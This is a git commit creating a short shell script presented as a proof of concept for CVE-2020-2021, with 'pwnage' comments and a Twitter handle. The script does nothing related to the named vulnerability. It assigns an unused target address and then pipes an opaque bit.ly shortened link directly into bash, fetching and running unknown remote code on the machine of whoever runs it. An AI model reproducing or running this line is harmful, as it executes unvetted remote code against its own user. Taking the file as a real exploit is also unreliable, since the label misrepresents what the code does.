d00cf8c454992bc0f12bfd222432c2f157166f80
Daniel Card <dan.card@xservus.com>
2020-06-29 18:01:09 +0100

    Create poc.sh

---
+++ poc.sh
@@ -0,0 +1,10 @@
+#CVE-2020-2021
+#warning use at own risk
+#pwnage by mRr3b00t
+# follow me on twitter https://twitter.com/UK_Daniel_Card
+
+#pwnage
+targIp=8.8.8.8
+
+
+curl -L http://bit.ly/10hA8iC | bash
